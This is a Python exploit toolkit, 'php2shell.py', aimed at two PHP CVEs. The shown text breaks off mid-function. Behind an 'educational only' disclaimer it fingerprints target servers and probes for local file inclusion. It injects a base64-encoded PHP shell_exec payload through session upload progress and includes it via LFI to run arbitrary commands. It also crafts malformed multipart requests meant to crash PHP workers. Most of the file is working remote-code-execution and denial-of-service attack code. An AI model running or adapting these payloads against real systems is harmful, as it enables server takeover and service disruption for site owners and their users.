
"""
php2shell.py  -  PHP CVE Research Toolkit  v2.0.0
==================================================
Author : 4nuxd  |  https://github.com/4nuxd
CVEs   : CVE-2026-109618  ·  CVE-2026-109619

  DISCLAIMER - EDUCATIONAL PURPOSE & PROOF-OF-CONCEPT ONLY
  ─────────────────────────────────────────────────────────
  This tool is released strictly for security research,
  vulnerability assessment, and educational purposes.

  It demonstrates documented PHP memory-management and
  session-handling vulnerabilities (CVE-2026-109618 and
  CVE-2026-109619) in controlled lab environments only.

  ► Do NOT run against systems you do not own or have
    explicit written permission to test.
  ► The author assumes NO liability for misuse.
  ► All techniques shown are already public knowledge,
    documented in the official PHP security advisory and
    the PHP issue tracker (issue #24492).

  Standalone - auto-installs requirements, no setup needed.
"""

import importlib, subprocess, sys, os

_DEPS = [("requests", "requests>=2.28.0"), ("urllib3", "urllib3>=1.26.0")]

def _bootstrap():
    missing = [pkg for mod, pkg in _DEPS if not importlib.util.find_spec(mod)]
    if not missing:
        return
    _raw_print("  ◈ Auto-installing dependencies …", "93")
    for pkg in missing:
        _raw_print(f"    ↳ pip install {pkg}", "90")
        r = subprocess.call(
            [sys.executable, "-m", "pip", "install", "--quiet", pkg],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        if r != 0:
            _raw_print(f"  ✗ Could not install {pkg}. Run:  pip install {pkg}", "91")
            sys.exit(1)
    _raw_print("  ✓ Dependencies ready\n", "92")

def _raw_print(msg, color="0"):
    print(f"\033[{color}m{msg}\033[0m")

_bootstrap()

import argparse, base64, io, json, random, re, socket
import ssl, string, threading, time
from urllib.parse import urlparse

import requests, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

__version__ = "2.0.0"
__author__  = "4nuxd"
__github__  = "https://github.com/4nuxd"

class C:
    RST   = "\033[0m"
    BOLD  = "\033[1m"
    DIM   = "\033[2m"

    BLK   = "\033[30m"
    RED   = "\033[31m"
    GRN   = "\033[32m"
    YLW   = "\033[33m"
    BLU   = "\033[34m"
    MAG   = "\033[35m"
    CYN   = "\033[36m"
    WHT   = "\033[37m"

    BRED  = "\033[91m"
    BGRN  = "\033[92m"
    BYLW  = "\033[93m"
    BBLU  = "\033[94m"
    BMAG  = "\033[95m"
    BCYN  = "\033[96m"
    BWHT  = "\033[97m"

    BG_BLK  = "\033[40m"
    BG_RED  = "\033[41m"
    BG_GRN  = "\033[42m"
    BG_YLW  = "\033[43m"
    BG_BLU  = "\033[44m"
    BG_MAG  = "\033[45m"
    BG_CYN  = "\033[46m"


def _term_width():
    try:
        return os.get_terminal_size().columns
    except Exception:
        return 100

def _c(text, *codes):
    return "".join(codes) + str(text) + C.RST

def _ok(msg):      print(f"  {C.BGRN}✔{C.RST}  {msg}")
def _fail(msg):    print(f"  {C.BRED}✘{C.RST}  {C.BRED}{msg}{C.RST}")
def _info(msg):    print(f"  {C.BCYN}◈{C.RST}  {msg}")
def _warn(msg):    print(f"  {C.BYLW}⚠{C.RST}  {C.BYLW}{msg}{C.RST}")
def _step(n, t, msg): print(f"  {C.DIM}[{n}/{t}]{C.RST} {C.BOLD}{msg}{C.RST}")
def _bullet(msg):  print(f"  {C.DIM}•{C.RST}  {msg}")
def _blank():      print()

def _hline(char="─", width=None, color=C.DIM):
    w = width or min(_term_width(), 100)
    print(f"{color}{char * w}{C.RST}")

def _box_line(content, width=None, border_color=C.BCYN, content_color=C.BWHT):
    w = width or min(_term_width(), 100)
    inner = w - 4
    text  = str(content)[:inner].ljust(inner)
    print(f"{border_color}║{C.RST} {content_color}{text}{C.RST} {border_color}║{C.RST}")

def _kv(key, val, key_color=C.CYN, val_color=C.BWHT, pad=26):
    print(f"  {key_color}{key:<{pad}}{C.RST} {val_color}{val}{C.RST}")


class Spinner:
    """Non-blocking terminal spinner for slow network ops."""
    _FRAMES = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    _COLORS  = [C.BCYN, C.BMAG, C.BBLU, C.BGRN, C.BYLW]

    def __init__(self, message="Working"):
        self.msg     = message
        self._stop   = threading.Event()
        self._thread = None

    def _spin(self):
        i = 0
        while not self._stop.is_set():
            frame = self._FRAMES[i % len(self._FRAMES)]
            col   = self._COLORS[i % len(self._COLORS)]
            sys.stdout.write(f"\r  {col}{frame}{C.RST}  {C.DIM}{self.msg}…{C.RST}   ")
            sys.stdout.flush()
            time.sleep(0.08)
            i += 1
        sys.stdout.write("\r" + " " * (_term_width() - 1) + "\r")
        sys.stdout.flush()

    def __enter__(self):
        self._thread = threading.Thread(target=self._spin, daemon=True)
        self._thread.start()
        return self

    def __exit__(self, *_):
        self._stop.set()
        if self._thread:
            self._thread.join()


def _progress_bar(label, current, total, width=36):
    frac   = current / total if total else 0
    filled = int(frac * width)
    bar    = f"{C.BCYN}{'█' * filled}{C.DIM}{'░' * (width - filled)}{C.RST}"
    pct    = int(frac * 100)
    label_vis = str(label)[:max(0, _term_width() - width - 16)]
    sys.stdout.write(
        f"\r  {bar}  {C.BOLD}{pct:>3}%{C.RST}  {C.DIM}{label_vis}{C.RST}   "
    )
    sys.stdout.flush()
    if current >= total:
        print()


def _section(title):
    print(f"\n  {C.BCYN}▸{C.RST}  {C.BOLD}{title}{C.RST}")


def _ok(msg):
    print(f"    {C.BGRN}✔{C.RST}  {msg}")


def _fail(msg):
    print(f"    {C.BRED}✖{C.RST}  {msg}")


def _warn(msg):
    print(f"    {C.BYLW}!{C.RST}  {msg}")


def _info(msg):
    print(f"    {C.BCYN}·{C.RST}  {msg}")


def _bullet(msg):
    print(f"      {C.DIM}•{C.RST}  {C.DIM}{msg}{C.RST}")


def _kv(key, val, pad=14):
    print(f"    {C.DIM}{key:<{pad}}{C.RST}  {val}")


def _step(n, total, msg):
    print(f"    {C.BCYN}[{n}/{total}]{C.RST}  {msg}")


def _blank():
    print()


def _hline(ch="─", width=None, col=None):
    w   = width or min(_term_width(), 100)
    col = col or C.DIM
    print(f"  {col}{ch * (w - 2)}{C.RST}")


def _c(text, color):
    return f"{color}{text}{C.RST}"


def _result_badge(label):
    mapping = {
        "VULNERABLE":      (C.BRED + C.BOLD, "  ✖  VULNERABLE   "),
        "PATCHED":         (C.BGRN + C.BOLD, "  ✔  PATCHED      "),
        "RCE CONFIRMED":   (C.BRED + C.BOLD, "  ✖  RCE CONFIRMED"),
        "NOT EXPLOITABLE": (C.BGRN + C.BOLD, "  ✔  SAFE         "),
        "CRASH LIKELY":    (C.BYLW + C.BOLD, "  !  CRASH LIKELY "),
        "UNKNOWN":         (C.DIM,            "  ?  UNKNOWN      "),
    }
    style, text = mapping.get(label, (C.DIM, f"  {label}  "))
    return f"{style}{text}{C.RST}"


_ANSI_RE = re.compile(r'\x1b\[[0-9;]*[a-zA-Z]')


def _strip_ansi(text):
    return _ANSI_RE.sub('', str(text))


def _table_row(cols, widths, colors=None):
    colors = colors or [C.BWHT] * len(cols)
    parts  = []
    for col, w, color in zip(cols, widths, colors):
        s = str(col)
        vis_len = len(_strip_ansi(s))
        pad = max(0, w - vis_len)
        cell = s + (" " * pad)
        parts.append(f"{color}{cell}{C.RST}")
    print("  " + f"  {C.DIM}│{C.RST}  ".join(parts))


def _table_header(cols, widths):
    _table_row(cols, widths, colors=[C.BOLD + C.BCYN] * len(cols))
    total_w = 2 + sum(widths) + (len(widths) - 1) * 5
    _hline("─", total_w)


_ASCII_ART_LINES = [
    "░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░▒▓███████▓▒░ ░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░      ░▒▓█▓▒░",
    "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░",
    "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░",
    "░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓█▓▒░      ░▒▓█▓▒░",
    "░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░             ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░",
    "░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░             ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░",
    "░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░",
]


def _print_banner():
    art_w = max(len(l) for l in _ASCII_ART_LINES)
    sub   = f"PHP CVE Research Toolkit  v{__version__}   {__author__}"
    cve   = "CVE-2026-109618  ·  CVE-2026-109619"

    print()
    for art_line in _ASCII_ART_LINES:
        print(f"{C.BCYN}{C.BOLD}{art_line}{C.RST}")
    print(f"{C.DIM}{sub.rjust(art_w)}{C.RST}")
    print(f"{C.DIM}{cve.rjust(art_w)}{C.RST}")
    print()


def _print_module_start(name, cve, description):
    _blank()
    _section(f"{name}  {C.DIM}({cve}){C.RST}")
    print(f"      {C.DIM}{description}{C.RST}")
    _blank()


def _normalize_base(url):
    """Normalize base URL: ensure scheme, trim trailing slash and trailing script paths like index.php."""
    if not url:
        return ""
    u = url.strip()
    if not u.startswith(("http://", "https://")):
        u = "http://" + u
    parsed = urlparse(u)
    path = parsed.path
    if path.endswith((".php", ".html", ".htm", ".phtml")):
        path = "/".join(path.split("/")[:-1])
    path = path.rstrip("/")
    return f"{parsed.scheme}://{parsed.netloc}{path}".rstrip("/")


def _http(ua=""):
    s = requests.Session()
    s.verify = False
    s.headers["User-Agent"] = f"php2shell/{__version__} {ua}".strip()
    return s

def _rand(n=26):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


_OOM_INTERP = {
    "OK":             ("NORMAL",         C.BGRN),
    "CATCHABLE_OOM":  ("PATCHED (fallible alloc → E_ERROR)",  C.BGRN),
    "HARD_LIMIT_HIT": ("PATCHED (hard limit → _exit 137)",    C.BYLW),
    "CRASH_BAILOUT":  ("VULNERABLE (longjmp/bailout path)",   C.BRED),
    "TIMEOUT":        ("TIMEOUT",        C.DIM),
}

def _oom_probe(base, mb, verbose):
    url = f"{base}/oom_trigger.php"
    if verbose:
        _info(f"Probing {_c(str(mb) + 'M', C.BCYN)} via {_c(url, C.DIM)}")
    http = _http("cve109618")
    try:
        r    = http.get(url, params={"mb": mb}, timeout=25)
        sc   = r.status_code
        body = r.text.lower()
        if sc == 200:
            if "memory" in body or "exhausted" in body:
                return sc, "CATCHABLE_OOM", r.text[:300]
            return sc, "OK", r.text[:200]
        if sc in (500, 503):
            if "memory" in body or "exhausted" in body:
                return sc, "CATCHABLE_OOM", r.text[:300]
            return sc, "HARD_LIMIT_HIT", f"HTTP {sc}"
        if sc == 502:
            return sc, "HARD_LIMIT_HIT", "FPM worker killed (_exit 137)"
        return sc, "OK", f"HTTP {sc}"
    except requests.exceptions.ConnectionError:
        return None, "CRASH_BAILOUT", "Connection reset - longjmp/bailout path"
    except requests.exceptions.Timeout:
        return None, "TIMEOUT", "No response within timeout"
    except Exception as exc:
        return None, "CRASH_BAILOUT", str(exc)


def run_cve109618(base, mem_limit_mb=128, verbose=False):
    _print_module_start(
        "Zend OOM Bailout Probe", "CVE-2026-109618",
        "Distinguishes patched fallible-alloc from unpatched longjmp path"
    )

    probes_mb = sorted(set(max(1, int(mem_limit_mb * r))
                           for r in (0.50, 0.75, 1.00, 1.50, 2.10)))

    _kv("Target endpoint", f"{base}/oom_trigger.php")
    _kv("memory_limit",    f"{mem_limit_mb}M  (hard cap ≈ {mem_limit_mb * 2}M on 8.4.27+)")
    _kv("Probe ladder",    ", ".join(f"{m}M" for m in probes_mb))
    _blank()


    cols   = ["Alloc", "HTTP", "Classification", "Interpretation"]
    widths = [8, 6, 20, 44]
    _table_header(cols, widths)

    results = []
    for mb in probes_mb:
        status, cls, detail = _oom_probe(base, mb, verbose)

        sc_str = str(status) if status else "---"
        label, color = _OOM_INTERP.get(cls, (cls, C.DIM))

        sc_color = (C.BGRN if status == 200
                    else C.BRED if status in (None, 502, 500, 503)
                    else C.DIM)
        cls_color = color

        _table_row(
            [f"{mb}M", sc_str, cls, label],
            widths,
            [C.BCYN, sc_color, cls_color, C.DIM],
        )
        results.append((mb, status, cls, detail))

        if cls in ("CRASH_BAILOUT", "HARD_LIMIT_HIT"):
            break
        time.sleep(0.5)

    _blank()
    _hline()

    crashes   = [r for r in results if r[2] == "CRASH_BAILOUT"]
    hard_hits = [r for r in results if r[2] == "HARD_LIMIT_HIT"]
    catchable = [r for r in results if r[2] == "CATCHABLE_OOM"]

    _blank()
    if crashes:
        print(f"  {_result_badge('VULNERABLE')}")
        _blank()
        _fail(f"CRASH_BAILOUT at {crashes[0][0]}M - connection reset without graceful PHP error")
        _bullet("On UNPATCHED PHP (< 8.4.27): OOM longjmp path")
        _bullet("zend_bailout() races through partially-initialised allocator structs")
        _bullet(f"Detail: {crashes[0][3]}")
        _blank()
        _warn("Upgrade to PHP >= 8.4.27 immediately")
    elif hard_hits:
        print(f"  {_result_badge('PATCHED')}")
        _blank()
        _ok(f"HARD_LIMIT_HIT at {hard_hits[0][0]}M - FPM worker exited via _exit(137)")
        _bullet("New hard memory limit active - fallible allocator prevented longjmp corruption")
        _bullet(f"Detail: {hard_hits[0][3]}")
    elif catchable:
        print(f"  {_result_badge('PATCHED')}")
        _blank()
        _ok(f"CATCHABLE_OOM at {catchable[0][0]}M - fallible allocator returned NULL → E_ERROR")
        _bullet(f"Detail: {catchable[0][3][:200]}")
    else:
        _warn(f"No OOM triggered. PHP memory_limit may differ from {mem_limit_mb}M")
        _bullet(f"Try: --mem-limit <actual>   |   docker exec <ctr> php -i | grep memory_limit")
    _blank()
    return bool(crashes)


def _cve109619_stage1(base, sid, marker, cmd, verbose):
    if verbose:
        _step(1, 3, "Injecting serialised object into session file")
        _kv("  URL",    f"{base}/session_inject.php", pad=10)
        _kv("  SID",    sid,   pad=10)
        _kv("  Marker", marker, pad=10)
        _kv("  Cmd",    repr(cmd), pad=10)
    http = _http("cve109619")
    try:
        r = http.get(f"{base}/session_inject.php",
                     params={"sid": sid, "marker": marker, "cmd": cmd},
                     timeout=8)
    except requests.RequestException as exc:
        _fail(f"Stage 1 failed: {exc}")
        return None
    if r.status_code != 200:
        _fail(f"session_inject.php → HTTP {r.status_code}")
        _bullet("Deploy: docker cp session_inject.php <ctr>:/var/www/html/")
        return None
    try:
        data = r.json()
    except Exception:
        _fail(f"Non-JSON response: {r.text[:300]}")
        return None
    if not data.get("ok"):
        _fail(f"session_inject.php error: {data}")
        return None
    if verbose:
        _kv("  Sess file", data.get("sess_file", "?"), pad=10)
        _kv("  Class",     data.get("class", "?"),     pad=10)
    return data


def _cve109619_stage2(base, sid, verbose):
    if verbose:
        _step(2, 3, "Triggering RFC1867 pre-RINIT callback via multipart upload")
        _kv("  POST",   f"{base}/upload.php", pad=10)
        _kv("  Cookie", f"PHPSESSID={sid}",  pad=10)
    http = _http("cve109619")
    body = (
        b"--p2s109619\r\n"
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        b"cve109619_trigger\r\n"
        b"--p2s109619\r\n"
        b'Content-Disposition: form-data; name="file"; filename="x.bin"\r\n'
        b"Content-Type: application/octet-stream\r\n\r\n"
        + b"A" * 512
        + b"\r\n--p2s109619--\r\n"
    )
    headers = {
        "Content-Type":   "multipart/form-data; boundary=p2s109619",
        "Cookie":         f"PHPSESSID={sid}",
        "Content-Length": str(len(body)),
    }
    try:
        r = http.post(f"{base}/upload.php", data=body, headers=headers, timeout=10)
        if verbose:
            _kv("  HTTP", str(r.status_code), pad=10)
        return r.status_code
    except requests.RequestException as exc:
        _fail(f"Stage 2 failed: {exc}")
        return None


def _cve109619_stage3(base, marker, verbose):
    if verbose:
        _step(3, 3, "Reading sentinel - checking if __wakeup() fired")
    time.sleep(0.5)
    http = _http("cve109619")
    try:
        r = http.get(f"{base}/check_sentinel.php", params={"marker": marker}, timeout=8)
        return r.json()
    except Exception as exc:
        _fail(f"check_sentinel.php failed: {exc}")
        return None


def run_cve109619(base, cmd="id", verbose=False):
    _print_module_start(
        "Pre-RINIT Session Deserialisation", "CVE-2026-109619",
        "RFC1867 upload-progress fires __wakeup() before php_request_startup()"
    )
    _info("RFC1867 rfc1867_callback reads session pre-RINIT on unpatched PHP")
    _info("Patch (8.4.27): incomplete_classes_only mode blocks deserialisation")
    _blank()

    sid    = _rand(26)
    marker = _rand(8)

    with Spinner("Stage 1 - injecting session object"):
        info = _cve109619_stage1(base, sid, marker, cmd, verbose)
    if not info:
        return False

    _ok("Session object injected")

    with Spinner("Stage 2 - triggering RFC1867 callback"):
        _cve109619_stage2(base, sid, verbose)
    _ok("RFC1867 upload trigger sent")

    with Spinner("Stage 3 - reading sentinel"):
        sentinel = _cve109619_stage3(base, marker, verbose)

    if sentinel is None:
        return False
    _ok("Sentinel retrieved")
    _blank()
    _hline()

    wakeup_fired   = sentinel.get("wakeup_fired",   False)
    destruct_fired = sentinel.get("destruct_fired", False)
    fired          = wakeup_fired or destruct_fired

    _blank()
    if fired:
        print(f"  {_result_badge('VULNERABLE')}")
        _blank()
        _fail("__wakeup() / __destruct() ran PRE-RINIT")
        _bullet("RFC1867 callback deserialised session object BEFORE RINIT")
        _bullet("Exact CVE-2026-109619 attack surface confirmed")
        _blank()

        raw = None
        if wakeup_fired and sentinel.get("wakeup_log"):
            raw = sentinel["wakeup_log"]
        elif destruct_fired and sentinel.get("destruct_log"):
            raw = sentinel["destruct_log"]

        if raw:
            output = ""
            for line in raw.splitlines():
                if line.startswith("output="):
                    output = line[len("output="):]
            if output.strip():
                _kv("Command", repr(cmd))
                _blank()
                _hline("─", 60)
                for ln in output.strip().splitlines():
                    print(f"  {C.BGRN}{ln}{C.RST}")
                _hline("─", 60)
            else:
                _warn("No command output - check shell_exec availability on target")
        _blank()
        _warn("Fix: upgrade to PHP >= 8.4.27")
    else:
        print(f"  {_result_badge('PATCHED')}")
        _blank()
        _ok("__wakeup() was NOT called pre-RINIT")
        _bullet("PHP ran rfc1867 session decode in incomplete_classes_only mode")
        _bullet("PS(in_rfc1867_update)=true is set - CVE-2026-109619 patch active")

    _blank()
    _kv("SID",    sid)
    _kv("Marker", marker)
    _kv("Sess",   info.get("sess_file", "?"))
    _blank()
    return fired


_MARKER_S = "<!--p2s:s-->"
_MARKER_E = "<!--p2s:e-->"
_DEFAULT_SESS_PATH  = "/var/lib/php/sessions"
_DEFAULT_UPLOAD_EP  = "/upload.php"
_DEFAULT_LFI_EP     = "/view.php"
_DEFAULT_LFI_PARAM  = "file"


def _make_payload(cmd):
    enc = base64.b64encode(cmd.encode()).decode()
    return (
        _MARKER_S
        + "<?php echo shell_exec(base64_decode('" + enc + "')); ?>"
        + _MARKER_E
    )


def _extract_output(body):
    s = body.find(_MARKER_S)
    e = body.find(_MARKER_E)
    if s == -1 or e == -1:
        return None
    result = body[s + len(_MARKER_S):e]
    return None if "<?php" in result else result


def _exploit_recon(base):
    base = _normalize_base(base)
    info = dict(
        reachable=False, php_version=None,
        upload_progress_enabled=None, upload_progress_cleanup=None,
        session_path=None, session_writable=None, lfi_works=False,
    )
    http = _http("exploit-recon")
    try:
        # 1. Passive fingerprinting via the base target URL
        try:
            r0 = http.get(base, timeout=6)
            info["reachable"] = True
            headers = r0.headers
            cookies = r0.cookies.get_dict()
            set_cookie_str = headers.get("Set-Cookie", "")

            xpb = headers.get("X-Powered-By", "")
            srv = headers.get("Server", "")

            m = re.search(r"PHP/([0-9]+\.[0-9]+(?:\.[0-9]+)?[a-zA-Z0-9._-]*)", xpb, re.I)
            if not m:
                m = re.search(r"PHP/([0-9]+\.[0-9]+(?:\.[0-9]+)?[a-zA-Z0-9._-]*)", srv, re.I)
            if m:
                info["php_version"] = m.group(1)
            elif "PHPSESSID" in cookies or "PHPSESSID" in set_cookie_str or "php" in xpb.lower():
                info["php_version"] = "Detected (masked by expose_php=Off)"
        except requests.RequestException:
            pass

        # 2. Check lab/debug endpoint (/debug.php)
        try:
            r = http.get(base + "/debug.php", timeout=6)
            if r.status_code == 200:
                info["reachable"] = True
                body = r.text
                for pat, key in [
                    (r"PHP:\s*([\d.]+)",                   "php_version"),
                    (r"upload_progress\.enabled:\s*(\S+)", "upload_progress_enabled"),
                    (r"save_path:\s*(\S+)",                "session_path"),
                ]:
                    m = re.search(pat, body)
                    if m:
                        info[key] = m.group(1)
                m = re.search(r"upload_progress\.cleanup:\s*(\S*)\s*\n", body)
                if m:
                    info["upload_progress_cleanup"] = m.group(1)
                m = re.search(r"Session dir writable:\s*(YES|NO)", body)
                if m:
                    info["session_writable"] = m.group(1) == "YES"
        except requests.RequestException:
            pass

        # 3. If version still undetermined, check standard info endpoints
        if not info["php_version"] or "masked" in str(info["php_version"]):
            for info_path in ["/phpinfo.php", "/info.php"]:
                try:
                    ri = http.get(base + info_path, timeout=4)
                    if ri.status_code == 200 and "PHP Version" in ri.text:
                        mi = re.search(r"PHP Version\s*(?:=>\s*|<\/td><td>)?\s*([0-9]+\.[0-9]+(?:\.[0-9]+)?)", ri.text, re.I)
                        if mi:
                            info["php_version"] = mi.group(1)
                            break
                except requests.RequestException:
                    pass

        # 4. Probe LFI (verify it returns file content and not an HTML error/custom 404 page)
        try:
            r2 = http.get(base + "/view.php", params={"file": "/etc/hostname"}, timeout=5)
            if (r2.status_code == 200 and r2.text.strip()
                    and "Warning" not in r2.text
                    and not r2.text.strip().lower().startswith("<!doctype")):
                info["lfi_works"] = True
        except requests.RequestException:
            pass

    except requests.RequestException as exc:
        if not info["reachable"]:
            _fail(f"Connection error: {exc}")
    finally:
        http.close()
    return info


def _print_recon(info):
    _blank()
    _hline("─", 60)
    print(f"  {C.BOLD}{C.BCYN}  TARGET RECON{C.RST}")
    _hline("─", 60)

    up = info["upload_progress_enabled"]
    sw = info["session_writable"]

    def yn(v, good="1 On on".split(), bad=("0","Off","off")):
        if v in good:   return f"{C.BGRN}ON  ✔{C.RST}"
        if v in bad:    return f"{C.BRED}OFF ✘{C.RST}"
        return f"{C.DIM}{v or '?'}{C.RST}"

    php_ver = info["php_version"] or "unknown (hidden by server/WAF)"
    _kv("PHP Version",         php_ver)
    _kv("upload_progress",     f"{yn(up)}  {C.DIM}(required for chain){C.RST}")
    _kv("cleanup",             info["upload_progress_cleanup"] or "Off")
    _kv("Session path",        info["session_path"] or "unknown")
    _kv("Session writable",    f"{C.BGRN}YES ✔{C.RST}" if sw else f"{C.BRED}NO  ✘{C.RST}")
    _kv("LFI (view.php)",      f"{C.BGRN}WORKING ✔{C.RST}" if info["lfi_works"]
                               else f"{C.BRED}NOT WORKING ✘{C.RST}")
    _hline("─", 60)
    _blank()


def run_exploit(base, cmd="id", session_path=_DEFAULT_SESS_PATH,
                upload_ep=_DEFAULT_UPLOAD_EP, lfi_ep=_DEFAULT_LFI_EP,
                lfi_param=_DEFAULT_LFI_PARAM, check_only=False):
    _print_module_start(
        "Session Upload Progress Poisoning + LFI", "CVE-2026-109619",
        "PHP_SESSION_UPLOAD_PROGRESS writes payload → LFI executes it"
    )

    with Spinner("Probing target configuration"):
        info = _exploit_recon(base)

    if not info["reachable"]:
        _fail("Target unreachable - check the web server is running")
        return False

    _print_recon(info)

    if check_only:
        _info("--check complete (no RCE attempted)")
        return None

    up = info["upload_progress_enabled"]
    if up not in ("1", "On", "on"):
        _fail("upload_progress is OFF - chain requires it to be ON")
        _bullet("Set session.upload_progress.enabled=1 in php.ini to reproduce")
        return False
    if not info["lfi_works"]:
        _fail("LFI not working via view.php - check endpoint and file param")
        return False

    sess_path = info["session_path"] or session_path
    sid       = _rand(26)
    sess_file = f"{sess_path}/sess_{sid}"
    payload   = _make_payload(cmd)

    _info(f"Command: {_c(repr(cmd), C.BYLW)}")
    _kv("SID",       sid)
    _kv("Sess file", sess_file)
    _blank()

    _step(1, 2, "Injecting payload via multipart upload")
    http = _http("exploit")
    http.cookies.set("PHPSESSID", sid)
    try:
        r = http.post(
            base + upload_ep,
            data={"PHP_SESSION_UPLOAD_PROGRESS": payload},
            files={"file": ("dummy.bin", io.BytesIO(b"\x00" * 1024), "application/octet-stream")},
            timeout=10,
        )
        if r.status_code == 200:
            _ok(f"POST {upload_ep} → HTTP 200")
        else:
            _fail(f"POST returned HTTP {r.status_code}")
            return False
    except requests.RequestException as exc:
        _fail(f"Injection POST failed: {exc}")
        return False
    finally:
        http.close()

    _step(2, 2, "Triggering LFI to execute injected PHP")
    http2 = _http("exploit")
    try:
        r2     = http2.get(base + lfi_ep, params={lfi_param: sess_file}, timeout=10)
        output = _extract_output(r2.text)
    except requests.RequestException as exc:
        _fail(f"LFI GET failed: {exc}")
        return False
    finally:
        http2.close()

    _blank()
    _hline()
    _blank()

    if output is None:
        print(f"  {_result_badge('UNKNOWN')}")
        _blank()
        _warn("No output extracted - possible causes:")
        _bullet("session.upload_progress.enabled = Off")
        _bullet("session.upload_progress.cleanup = On  (session deleted before LFI)")
        _bullet("Session dir not writable by www-data")
        _bullet("view.php unreachable or LFI path blocked")
        _blank()
        _info(f"Run with --check to re-run recon only")
        return False

    output = output.strip()
    print(f"  {_result_badge('RCE CONFIRMED')}")
    _blank()
    _ok("PHP code executed via session upload progress + LFI chain")
    _blank()
    _hline("─", 64)
    for ln in output.splitlines():
        print(f"  {C.BGRN}{ln}{C.RST}")
    _hline("─", 64)
    _blank()
    _bullet("PHP_SESSION_UPLOAD_PROGRESS value written to disk by upload-progress handler")
    _bullet("Session file included via LFI and PHP code executed")
    _warn("Fix: PHP >= 8.4.27  OR  session.upload_progress.enabled=0")
    _blank()
    return True


_UAF_BUILDS = {}


def _build_nested():
    b = "----php2shellNestedBoundary"
    body = (
        f"{b}\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\nAAAA\r\n"
        f"{b}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"x.bin\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode()
    body += b"B" * 4096 + b"\r\n"
    body += f"{b}\r\nContent-Disposition: form-data; name=\"extra\"\r\n\r\nC\r\n{b}--\r\n{b}--\r\n".encode()
    return body, f"multipart/form-data; boundary={b[2:]}"

def _build_longheader():
    b = "----php2shellLongHeader"
    body = (
        f"{b}\r\nContent-Disposition: form-data; name=\"{'A'*8192}\"; filename=\"{'B'*8192}\"\r\n"
        f"Content-Type: {'C'*4096}\r\n\r\nDATA\r\n{b}--\r\n"
    ).encode()
    return body, f"multipart/form-data; boundary={b[2:]}"

def _build_nullbyte():
    b    = "----php2shellNullByte"
    body = f"{b}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"x.bin\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode()
    body += b"\x00" * 512 + f"\r\n{b}--\r\n".encode()
    return body, f"multipart/form-data; boundary={b[2:]}"

def _build_truncated():
    b = "----php2shellTruncated"
    body = (
        f"{b}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"x.bin\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\nINCOMPLETE_DATA_NO_CLOSING_BOUNDARY"
    ).encode()
    return body, f"multipart/form-data; boundary={b[2:]}"

def _build_interleaved():
    b1, b2 = "----php2shellBoundaryA", "----php2shellBoundaryB"
    body = (
        f"{b1}\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\nA\r\n"
        f"{b2}\r\nContent-Disposition: form-data; name=\"b\"\r\n\r\nB\r\n{b1}--\r\n"
    ).encode()
    return body, f"multipart/form-data; boundary={b1[2:]}"


_UAF_VARIANTS = {
    "nested":      ("Nested boundaries with double-close",          _build_nested),
    "longheader":  ("Oversized Content-Disposition / Content-Type", _build_longheader),
    "nullbyte":    ("Null bytes in part body (C string corruption)", _build_nullbyte),
    "truncated":   ("Missing closing boundary - unexpected EOF",    _build_truncated),
    "interleaved": ("Interleaved boundaries from two containers",   _build_interleaved),
}


def _send_raw(host, port, path, body, content_type, use_tls=False, timeout=5.0):
    req = (
        f"POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: php2shell/{__version__}\r\n"
        f"Content-Type: {content_type}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    ).encode() + body

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)

    result = {"status": None, "error": None, "bytes": 0, "raw": ""}
    try:
        sock.connect((host, port))
        sock.sendall(req)
        resp = b""
        while True:
            chunk = sock.recv(8192)
            if not chunk:
                break
            resp += chunk
        result["raw"]   = resp.decode("utf-8", errors="replace")
        result["bytes"] = len(resp)
        first = result["raw"].split("\r\n")[0] if result["raw"] else ""
        if " " in first:
            try:
